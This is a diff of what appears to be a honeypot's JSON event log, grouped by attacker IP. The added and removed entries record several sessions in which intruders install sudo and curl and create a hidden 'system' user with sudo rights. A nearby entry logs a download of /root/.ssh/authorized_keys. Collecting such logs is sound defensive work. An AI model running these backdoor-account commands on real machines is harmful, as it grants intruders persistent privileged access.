@@ -5057,6 +5057,44 @@
             "session": "b8ab67ccb099"
         }
     ],
+    "142.93.177.188": [
+        {
+            "timestamp": "2023-11-09T16:19:10.794723Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 BCZgXSgh) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "8298ab9bb000"
+        },
+        {
+            "timestamp": "2023-11-09T16:19:10.795127Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 BCZgXSgh",
+            "session": "8298ab9bb000"
+        },
+        {
+            "timestamp": "2023-11-08T10:39:05.672487Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 bprfhGB4) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "e83cd4ee3970"
+        },
+        {
+            "timestamp": "2023-11-08T10:39:05.673028Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 bprfhGB4",
+            "session": "e83cd4ee3970"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:36.522635Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ne2ypqJY) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "bfc39e8ebd66"
+        },
+        {
+            "timestamp": "2023-11-08T22:03:36.523051Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 ne2ypqJY",
+            "session": "bfc39e8ebd66"
+        }
+    ],
     "159.65.146.149": [
         {
             "timestamp": "2023-11-06T00:04:20.154859Z",
@@ -19805,32 +19843,6 @@
             "event": "file_download",
             "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
             "session": "21a4ac48ec0a"
-        }
-    ],
-    "142.93.177.188": [
-        {
-            "timestamp": "2023-11-08T10:39:05.672487Z",
-            "event": "command_input",
-            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 bprfhGB4) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
-            "session": "e83cd4ee3970"
-        },
-        {
-            "timestamp": "2023-11-08T10:39:05.673028Z",
-            "event": "command_input",
-            "input": "openssl passwd -1 bprfhGB4",
-            "session": "e83cd4ee3970"
-        },
-        {
-            "timestamp": "2023-11-08T22:03:36.522635Z",
-            "event": "command_input",
-            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ne2ypqJY) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
-            "session": "bfc39e8ebd66"
-        },
-        {
-            "timestamp": "2023-11-08T22:03:36.523051Z",
-            "event": "command_input",
-            "input": "openssl passwd -1 ne2ypqJY",
-            "session": "bfc39e8ebd66"
         }
     ],
     "43.156.49.75": [
